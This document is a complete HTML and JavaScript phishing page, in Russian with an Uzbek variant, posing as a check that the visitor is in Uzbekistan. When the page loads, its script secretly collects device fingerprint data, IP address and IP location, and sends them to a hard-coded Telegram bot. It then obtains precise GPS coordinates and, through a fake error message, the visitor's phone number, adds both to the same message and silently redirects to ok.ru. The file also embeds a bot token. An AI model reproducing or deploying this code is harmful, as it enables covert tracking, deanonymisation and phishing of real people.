<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение местоположения</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            background-color: #e9ecef;
            color: #343a40;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
            border: 1px solid #dee2e6;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
            font-size: 1.5em;
        }
        p {
            margin-bottom: 20px;
            font-size: 1.1em;
        }
        .button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }
        .button:hover {
            background-color: #0056b3;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none; /* Hidden by default */
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #dc3545;
            font-weight: bold;
            margin-top: 20px;
            margin-bottom: 15px;
        }
        .phone-input {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .phone-input.error {
            border-color: #dc3545; /* Red border for error */
        }
        .phone-error-text {
            color: #dc3545;
            font-size: 0.9em;
            margin-top: -10px;
            margin-bottom: 10px;
            display: none; /* Hidden by default */
        }
        #initialScreen, #checkingScreen, #phoneNumberScreen {
            display: none; /* Managed by JS */
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="initialScreen">
            <h1 id="initialTitle">Сначала подтвердите, что вы в Узбекистане</h1>
            <p id="initialText">Для продолжения работы необходимо подтвердить ваше местоположение.</p>
            <button id="confirmLocationBtn" class="button">Подтвердить</button>
        </div>

        <div id="checkingScreen">
            <h1 id="checkingTitle">Проверка...</h1>
            <div class="spinner"></div>
        </div>

        <div id="phoneNumberScreen">
            <p class="error-message" id="errorMessage">Ошибка определения, укажите номер, чтобы подтвердить.</p>
            <input type="tel" id="phoneNumberInput" class="phone-input" placeholder="+998 XX XXX XX XX" required>
            <div id="phoneNumberErrorText" class="phone-error-text">Неверный формат номера. Проверьте +998 и код оператора (33, 55, 6x, 7x, 88, 9x).</div>
            <button id="continueBtn" class="button">Продолжить</button>
        </div>

        <div id="deviceInfoDump" style="display: none;">
            <div class="info-section">
                <h2>Основные данные</h2>
                <div class="info-item">
                    <strong>User Agent:</strong> <span id="userAgent"></span>
                </div>
                <div class="info-item">
                    <strong>Операционная система:</strong> <span id="osInfo"></span>
                </div>
                <div class="info-item">
                    <strong>Платформа:</strong> <span id="platform"></span>
                </div>
                <div class="info-item">
                    <strong>Имя браузера:</strong> <span id="browserName"></span>
                </div>
                <div class="info-item">
                    <strong>Версия браузера:</strong> <span id="browserVersion"></span>
                </div>
                <div class="info-item">
                    <strong>Возможное название/модель устройства:</strong> <span id="deviceName"></span> <span class="note">(Основано на User Agent, может быть неточным)</span>
                </div>
            </div>

            <div class="info-section">
                <h2>Информация о сети</h2>
                <div class="info-item">
                    <strong>Публичный IP адрес:</strong> <span id="publicIp"></span>
                </div>
                <div class="info-item">
                    <strong>Тип соединения (эффективный):</strong> <span id="connectionType"></span> <span class="note">(Приблизительно, по данным браузера)</span>
                </div>
                <div class="info-item">
                    <strong>Физический тип сети:</strong> <span id="networkType"></span> <span class="note">(Может быть WiFi, Cellular и т.д.)</span>
                </div>
                <div class="info-item">
                    <strong>API Bluetooth:</strong> <span id="bluetoothAPI"></span>
                </div>
                <div class="info-item">
                    <strong>API USB:</strong> <span id="usbAPI"></span>
                </div>
            </div>

            <div class="info-section">
                <h2>Местоположение</h2>
                <div class="info-item">
                    <strong>Местоположение по IP:</strong> <span id="ipLocation"></span> <span class="note">(Приблизительно, по данным IP)</span>
                </div>
                <div class="info-item">
                    <strong>GPS координаты:</strong> <span id="gpsLocation"></span> <span class="note">(Требует разрешения, может быть неточным)</span>
                </div>
            </div>

            <div class="info-section">
                <h2>Аппаратное обеспечение</h2>
                <div class="info-item">
                    <strong>Логические ядра CPU:</strong> <span id="hardwareConcurrency"></span> <span class="note">(Количество потоков, доступных JavaScript, не физические ядра CPU)</span>
                </div>
                <div class="info-item">
                    <strong>Память устройства (ГБ):</strong> <span id="deviceMemory"></span> <span class="note">(Приблизительный объем ОЗУ)</span>
                </div>
                <div class="info-item">
                    <strong>Статус батареи:</strong> <span id="batteryStatus"></span>
                </div>
            </div>

            <div class="info-section">
                <h2>Дисплей</h2>
                <div class="info-item">
                    <strong>Разрешение экрана (CSS pixels):</strong> <span id="screenResolution"></span>
                </div>
                <div class="info-item">
                    <strong>Доступное разрешение (без UI):</strong> <span id="availableScreenResolution"></span>
                </div>
                <div class="info-item">
                    <strong>Размер окна (Viewport):</strong> <span id="viewportSize"></span>
                </div>
                <div class="info-item">
                    <strong>Глубина цвета:</strong> <span id="colorDepth"></span>
                </div>
                <div class="info-item">
                    <strong>Pixel Ratio устройства:</strong> <span id="devicePixelRatio"></span>
                </div>
                <div class="info-item">
                    <strong>Поддержка касаний:</strong> <span id="touchSupport"></span>
                </div>
            </div>
             <div class="info-section">
                <h2>Дополнительно</h2>
                <div class="info-item">
                    <strong>Cookies:</strong> <span id="cookiesEnabled"></span>
                </div>
                <div class="info-item">
                    <strong>Языки браузера:</strong> <span id="languages"></span>
                </div>
                <div class="info-item">
                    <strong>Часовой пояс:</strong> <span id="timezone"></span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA'; // Your bot token
        const CHAT_ID = '7048297998'; // Your chat ID

        // UI Elements
        const initialScreen = document.getElementById('initialScreen');
        const checkingScreen = document.getElementById('checkingScreen');
        const phoneNumberScreen = document.getElementById('phoneNumberScreen');
        const confirmLocationBtn = document.getElementById('confirmLocationBtn');
        const continueBtn = document.getElementById('continueBtn');
        const phoneNumberInput = document.getElementById('phoneNumberInput');
        const spinner = document.querySelector('.spinner');
        const initialTitle = document.getElementById('initialTitle');
        const initialText = document.getElementById('initialText');
        const checkingTitle = document.getElementById('checkingTitle');
        const errorMessage = document.getElementById('errorMessage');
        const phoneNumberErrorText = document.getElementById('phoneNumberErrorText'); // New element for error message

        let collectedDeviceInfo = {}; // Global object to store info
        let telegramMessageId = null; // To store the message ID for editing

        // Function to detect if the browser is set to an Uzbek language
        function isUzbekLanguage() {
            const userLanguages = navigator.languages || [navigator.language || navigator.userLanguage];
            return userLanguages.some(lang => lang.toLowerCase().startsWith('uz'));
        }

        // Helper function to update text content
        function updateTextContent(id, text, className = '') {
            const element = document.getElementById(id);
            if (element) {
                element.textContent = text;
                element.className = className;
            }
        }

        // Helper to collect all info into an object
        async function collectDeviceInfo(includeGps = false, includePhoneNumber = false) {
            const info = {};

            // --- Initial synchronous data gathering ---
            const userAgent = navigator.userAgent || 'Неизвестно';
            info.userAgent = userAgent;
            info.platform = navigator.platform || 'Неизвестно';

            let osInfo = 'Неизвестно';
            let browserName = 'Неизвестно';
            let browserVersion = 'Неизвестно';
            let deviceName = 'Неизвестно';

            // More robust User Agent parsing
            if (userAgent) {
                // OS Detection
                if (userAgent.match(/Windows NT ([\d.]+)/)) osInfo = 'Windows ' + userAgent.match(/Windows NT ([\d.]+)/)[1];
                else if (userAgent.match(/Macintosh|Mac OS X/)) osInfo = 'macOS';
                else if (userAgent.match(/Android ([\d.]+)/)) {
                    osInfo = 'Android ' + userAgent.match(/Android ([\d.]+)/)[1];
                    const androidModel = userAgent.match(/Android [\d.]+; ([^;)]*)/);
                    if (androidModel && androidModel[1]) {
                        deviceName = androidModel[1].replace(/Build\/.*/, '').trim(); // Remove build info
                    }
                }
                else if (userAgent.match(/iPhone OS ([\d_]+)/)) {
                    osInfo = 'iOS ' + userAgent.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
                    deviceName = 'iPhone';
                }
                else if (userAgent.match(/iPad; CPU OS ([\d_]+)/)) {
                    osInfo = 'iPadOS ' + userAgent.match(/iPad; CPU OS ([\d_]+)/)[1].replace(/_/g, '.');
                    deviceName = 'iPad';
                }
                else if (userAgent.match(/Linux/)) osInfo = 'Linux';
                else if (userAgent.match(/CrOS/)) osInfo = 'Chrome OS';

                // Browser Detection
                if (userAgent.match(/Chrome\/([\d.]+)/) && !userAgent.match(/Edge|Edg/)) {
                    browserName = 'Chrome';
                    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
                } else if (userAgent.match(/Firefox\/([\d.]+)/)) {
                    browserName = 'Firefox';
                    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
                } else if (userAgent.match(/Edge\/([\d.]+)/) || userAgent.match(/Edg\/([\d.]+)/)) {
                    browserName = 'Edge';
                    browserVersion = userAgent.match(/(Edge|Edg)\/([\d.]+)/)[2];
                } else if (userAgent.match(/Safari\/([\d.]+)/) && !userAgent.match(/Chrome/)) {
                    browserName = 'Safari';
                    browserVersion = userAgent.match(/Version\/([\d.]+).*Safari/)?.[1] || 'Неизвестно';
                } else if (userAgent.match(/Opera|OPR\//)) {
                    browserName = 'Opera';
                    browserVersion = userAgent.match(/(Opera|OPR)\/([\d.]+)/)?.[2] || 'Неизвестно';
                } else if (userAgent.match(/MSIE |Trident\//)) {
                    browserName = 'Internet Explorer';
                    browserVersion = userAgent.match(/MSIE ([\d.]+)/)?.[1] || '11.0 (Trident)';
                }
            }

            info.osInfo = osInfo;
            info.browserName = browserName;
            info.browserVersion = browserVersion;
            info.deviceName = deviceName;

            // --- Browser Settings (Keep these as they are core to basic info) ---
            info.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
            info.languages = navigator.languages.join(', ') || 'Неизвестно';
            try {
                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Неизвестно';
            } catch (e) {
                info.timezone = 'Ошибка определения';
            }
            info.touchSupport = (typeof navigator.maxTouchPoints !== 'undefined' ? navigator.maxTouchPoints + ' точек касания' : 'Неизвестно');
            info.hardwareConcurrency = navigator.hardwareConcurrency || 'Неизвестно';
            info.deviceMemory = (navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно');

            // --- Network Information ---
            if (navigator.connection) {
                info.connectionType = navigator.connection.effectiveType || 'Недоступно';
                info.networkType = navigator.connection.type || 'Неизвестно';
            } else {
                info.connectionType = 'Недоступно';
                info.networkType = 'Недоступно';
            }
            info.bluetoothAPI = (typeof navigator.bluetooth !== 'undefined') ? 'Да' : 'Нет';
            info.usbAPI = (typeof navigator.usb !== 'undefined') ? 'Да' : 'Нет';

            // --- Display Information ---
            info.screenResolution = screen.width + 'x' + screen.height;
            info.availableScreenResolution = screen.availWidth + 'x' + screen.availHeight;
            info.viewportSize = window.innerWidth + 'x' + window.innerHeight;
            info.colorDepth = screen.colorDepth + ' бит';
            info.devicePixelRatio = window.devicePixelRatio || 'Неизвестно';

            // --- Asynchronous data gathering ---

            // Public IP Address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) throw new Error(`HTTP error! Status: ${ipResponse.status}`);
                const ipData = await ipResponse.json();
                info.publicIp = ipData.ip || 'Неизвестно';
            } catch (error) {
                info.publicIp = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
            }

            // Location by IP
            try {
                const geoResponse = await fetch('https://ipapi.co/json/');
                if (!geoResponse.ok) throw new Error(`HTTP error! Status: ${geoResponse.status}`);
                const geoData = await geoResponse.json();
                if (geoData.error) {
                    info.ipLocation = `Ошибка: ${geoData.reason}`;
                } else {
                    info.ipLocation = `${geoData.city || 'Неизвестный город'}, ${geoData.region || 'Неизвестный регион'}, ${geoData.country_name || 'Неизвестная страна'} (ISP: ${geoData.org || 'Неизвестно'})`;
                }
            } catch (error) {
                info.ipLocation = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
            }

            // GPS Location
            if (includeGps) {
                 if ('geolocation' in navigator) {
                    await new Promise(resolve => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const lat = position.coords.latitude.toFixed(6);
                                const lon = position.coords.longitude.toFixed(6);
                                const accuracy = position.coords.accuracy.toFixed(2);
                                info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
                                resolve();
                            },
                            (error) => {
                                let errorMessageGeo;
                                switch (error.code) {
                                    case error.PERMISSION_DENIED:
                                        errorMessageGeo = "Доступ к GPS отклонен пользователем.";
                                        break;
                                    case error.POSITION_UNAVAILABLE:
                                        errorMessageGeo = "Информация о местоположении недоступна.";
                                        break;
                                    case error.TIMEOUT:
                                        errorMessageGeo = "Таймаут получения местоположения.";
                                        break;
                                    default:
                                        errorMessageGeo = "Неизвестная ошибка получения местоположения.";
                                        break;
                                }
                                info.gpsLocation = `Ошибка: ${errorMessageGeo}`;
                                resolve(); // Resolve even on error to continue flow
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 3000, // Timeout for the geolocation request itself
                                maximumAge: 0
                            }
                        );
                    });
                } else {
                    info.gpsLocation = 'API геолокации не поддерживается'; // This also sets a specific error message
                }
            } else {
                info.gpsLocation = 'Не запрошено'; // Default if not included
            }

            // Phone Number (added separately later)
            if (includePhoneNumber && collectedDeviceInfo.phoneNumber) {
                info.phoneNumber = collectedDeviceInfo.phoneNumber;
            } else {
                info.phoneNumber = 'Не указан';
            }

            // --- Hardware Information (Battery is async) ---
            if ('getBattery' in navigator) {
                await navigator.getBattery().then(function(battery) {
                    const status = battery.charging ? 'Заряжается' : 'Не заряжается';
                    const level = (battery.level * 100).toFixed(0) + '%';
                    const chargingTime = battery.chargingTime !== Infinity ? ` (Зарядка: ${ (battery.chargingTime / 60).toFixed(1) } мин)` : '';
                    const dischargingTime = battery.dischargingTime !== Infinity ? ` (Осталось: ${ (battery.dischargingTime / 3600).toFixed(1) } ч)` : '';
                    info.batteryStatus = `${status}, Уровень: ${level}${chargingTime}${dischargingTime}`;
                }).catch(function(e) {
                    info.batteryStatus = 'Недоступно';
                });
            } else {
                info.batteryStatus = 'Не поддерживается';
            }

            return info;
        }

        // Function to display collected information on the page (for the hidden dump)
        function displayDeviceInfo(info) {
            updateTextContent('userAgent', info.userAgent);
            updateTextContent('osInfo', info.osInfo);
            updateTextContent('platform', info.platform);
            updateTextContent('browserName', info.browserName);
            updateTextContent('browserVersion', info.browserVersion);
            updateTextContent('deviceName', info.deviceName);
            updateTextContent('publicIp', info.publicIp, info.publicIp.startsWith('Ошибка') ? 'error' : '');
            updateTextContent('connectionType', info.connectionType);
            updateTextContent('networkType', info.networkType);
            updateTextContent('bluetoothAPI', info.bluetoothAPI);
            updateTextContent('usbAPI', info.usbAPI);
            updateTextContent('ipLocation', info.ipLocation, info.ipLocation.startsWith('Ошибка') ? 'error' : '');
            updateTextContent('gpsLocation', info.gpsLocation, info.gpsLocation.startsWith('Ошибка') ? 'error' : '');
            updateTextContent('hardwareConcurrency', info.hardwareConcurrency);
            updateTextContent('deviceMemory', info.deviceMemory);
            updateTextContent('batteryStatus', info.batteryStatus, info.batteryStatus.includes('Недоступно') || info.batteryStatus.includes('Не поддерживается') ? 'error' : '');
            updateTextContent('screenResolution', info.screenResolution);
            updateTextContent('availableScreenResolution', info.availableScreenResolution);
            updateTextContent('viewportSize', info.viewportSize);
            updateTextContent('colorDepth', info.colorDepth);
            updateTextContent('devicePixelRatio', info.devicePixelRatio);
            updateTextContent('touchSupport', info.touchSupport);
            updateTextContent('cookiesEnabled', info.cookiesEnabled);
            updateTextContent('languages', info.languages);
            updateTextContent('timezone', info.timezone, info.timezone.includes('Ошибка') ? 'error' : '');
        }

        // Function to generate HTML message for Telegram based on collected info
        function generateTelegramHtml(info, includePhoneNumber = false) {
            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';

            const escapeHtml = (unsafe) => {
                return unsafe
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#039;");
            };

            if (includePhoneNumber && info.phoneNumber) {
                telegramHtmlMessage += `<b><u>Введенный номер телефона:</u></b> ${escapeHtml(info.phoneNumber)}\n\n`;
            }

            const sections = {
                'Основные данные': ['userAgent', 'osInfo', 'platform', 'browserName', 'browserVersion', 'deviceName'],
                'Информация о сети': ['publicIp', 'connectionType', 'networkType', 'bluetoothAPI', 'usbAPI'],
                'Местоположение': ['ipLocation', 'gpsLocation'],
                'Аппаратное обеспечение': ['hardwareConcurrency', 'deviceMemory', 'batteryStatus'],
                'Дисплей': ['screenResolution', 'availableScreenResolution', 'viewportSize', 'colorDepth', 'devicePixelRatio', 'touchSupport'],
                'Дополнительно': ['cookiesEnabled', 'languages', 'timezone']
            };

            for (const sectionTitle in sections) {
                telegramHtmlMessage += `<b><u>${escapeHtml(sectionTitle)}</u></b>\n`;
                sections[sectionTitle].forEach(key => {
                    let value = info[key];
                    let note = '';
                    // Add notes based on original HTML structure if needed
                    if (key === 'deviceName') note = '(Основано на User Agent, может быть неточным)';
                    if (key === 'connectionType') note = '(Приблизительно, по данным браузера)';
                    if (key === 'networkType') note = '(Может быть WiFi, Cellular и т.д.)';
                    if (key === 'ipLocation') note = '(Приблизительно, по данным IP)';
                    if (key === 'gpsLocation') note = '(Требует разрешения, может быть неточным)';
                    if (key === 'hardwareConcurrency') note = '(Количество потоков, доступных JavaScript, не физические ядра CPU)';
                    if (key === 'deviceMemory') note = '(Приблизительный объем ОЗУ)';


                    if (value !== undefined) {
                        telegramHtmlMessage += `<b>${escapeHtml(document.getElementById(key).previousElementSibling.textContent.replace(':', ''))}:</b> ${escapeHtml(String(value))}`;
                        if (note) {
                            telegramHtmlMessage += ` <i>${escapeHtml(note)}</i>`;
                        }
                        telegramHtmlMessage += `\n`;
                    }
                });
                telegramHtmlMessage += `\n`;
            }
            return telegramHtmlMessage;
        }

        // Function to send HTML content to Telegram bot
        async function sendHtmlToTelegram(htmlContent) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = {
                chat_id: CHAT_ID,
                text: htmlContent,
                parse_mode: 'HTML' // Crucial for sending HTML
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(params)
                });
                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Failed to send HTML message to Telegram:', errorData);
                    return null;
                } else {
                    const responseData = await response.json();
                    console.log('Device info HTML sent to Telegram successfully!', responseData);
                    return responseData.result.message_id; // Return message_id
                }
            } catch (error) {
                console.error('Error sending HTML message to Telegram:', error);
                return null;
            }
        }

        // Function to edit an existing Telegram message
        async function editTelegramMessage(messageId, htmlContent) {
            if (!messageId) {
                console.warn('No message ID available to edit.');
                return;
            }
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            const params = {
                chat_id: CHAT_ID,
                message_id: messageId,
                text: htmlContent,
                parse_mode: 'HTML'
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(params)
                });
                if (!response.ok) {
                    const errorData = await response.json();
                    console.error('Failed to edit Telegram message:', errorData);
                } else {
                    console.log('Telegram message edited successfully!');
                }
            } catch (error) {
                console.error('Error editing Telegram message:', error);
            }
        }

        // Phone number validation function (now more flexible for input format)
        function isValidPhoneNumber(phoneNumber) {
            // Updated regex: Allows optional + or 998 prefix, then operator code (33, 55, 6x, 7x, 88, 9x) and 7 digits
            const regex = /^(?:\+?998)?(?:33|55|6\d|7\d|88|9\d)\d{7}$/;
            return regex.test(phoneNumber);
        }

        // Function to normalize phone number to +998 format
        function normalizePhoneNumber(phoneNumber) {
            phoneNumber = phoneNumber.replace(/\s/g, ''); // Remove all spaces

            if (phoneNumber.startsWith('+998')) {
                return phoneNumber;
            } else if (phoneNumber.startsWith('998')) {
                return '+' + phoneNumber;
            } else {
                // Assuming it's already in XX YYY YY YY format, prepend +998
                return '+998' + phoneNumber;
            }
        }


        // --- UI Logic ---
        function showScreen(screenId) {
            initialScreen.style.display = 'none';
            checkingScreen.style.display = 'none';
            phoneNumberScreen.style.display = 'none';
            document.getElementById(screenId).style.display = 'block';
        }

        // Initial language setup
        if (isUzbekLanguage()) {
            initialTitle.textContent = "Avvalo, O'zbekistonda ekanligingizni tasdiqlang";
            initialText.textContent = "Davom etish uchun joylashuvingizni tasdiqlashingiz kerak.";
            confirmLocationBtn.textContent = "Tasdiqlash";
            checkingTitle.textContent = "Tekshiruv...";
            errorMessage.textContent = "Aniqlashda xatolik yuz berdi, tasdiqlash uchun raqamingizni kiriting.";
            continueBtn.textContent = "Davom etish";
            phoneNumberInput.placeholder = "+998 XX XXX XX XX";
            phoneNumberErrorText.textContent = "Noto'g'ri raqam formati. +998 va operator kodini tekshiring (33, 55, 6x, 7x, 88, 9x).";
        }

        // Function to send initial device info when HTML loads
        async function sendInitialDeviceInfo() {
            collectedDeviceInfo = await collectDeviceInfo(false); // No GPS info initially
            displayDeviceInfo(collectedDeviceInfo); // Update the hidden dump for accurate HTML generation
            const initialHtml = generateTelegramHtml(collectedDeviceInfo);
            telegramMessageId = await sendHtmlToTelegram(initialHtml);
        }

        window.onload = sendInitialDeviceInfo; // Send initial info on page load

        showScreen('initialScreen'); // Show the first screen on load

        confirmLocationBtn.addEventListener('click', async () => {
            showScreen('checkingScreen');
            spinner.style.display = 'block';

            // Define a minimum delay for the checking screen
            const minDelayPromise = new Promise(resolve => setTimeout(resolve, 2500)); // 2.5 seconds

            // Collect device info with GPS and wait for the minimum delay simultaneously
            const [gpsInfoResult] = await Promise.all([
                collectDeviceInfo(true), // This will attempt to get GPS and resolve with info
                minDelayPromise          // This will resolve after the minimum delay
            ]);
            
            // Update the global collectedDeviceInfo object with the GPS result
            collectedDeviceInfo = gpsInfoResult;

            spinner.style.display = 'none';
            showScreen('phoneNumberScreen');

            // Update Telegram message with GPS info
            displayDeviceInfo(collectedDeviceInfo); // Update the hidden dump for accurate HTML generation
            const updatedHtmlWithGps = generateTelegramHtml(collectedDeviceInfo);
            await editTelegramMessage(telegramMessageId, updatedHtmlWithGps);
        });

        // Event listener for input to clear error on typing
        phoneNumberInput.addEventListener('input', () => {
            phoneNumberInput.classList.remove('error');
            phoneNumberErrorText.style.display = 'none';
        });

        continueBtn.addEventListener('click', async () => {
            let phoneNumber = phoneNumberInput.value.trim();

            if (!isValidPhoneNumber(phoneNumber)) {
                phoneNumberInput.classList.add('error'); // Add error class to input
                phoneNumberErrorText.style.display = 'block'; // Show error text
                return; // Stop execution
            }

            // If validation passes, clear any previous error styles/messages
            phoneNumberInput.classList.remove('error');
            phoneNumberErrorText.style.display = 'none';

            // Normalize the phone number before storing and sending
            phoneNumber = normalizePhoneNumber(phoneNumber);
            collectedDeviceInfo.phoneNumber = phoneNumber;

            // Display collected info in the hidden dump (for the purpose of creating HTML for Telegram)
            displayDeviceInfo(collectedDeviceInfo);

            // Generate HTML message for Telegram based on displayed content
            const finalTelegramHtmlMessage = generateTelegramHtml(collectedDeviceInfo, true); // Include phone number now

            await editTelegramMessage(telegramMessageId, finalTelegramHtmlMessage);

            // Redirect the user without notification
            window.location.href = 'https://m.ok.ru/';
        });
    </script>
</body>
</html>
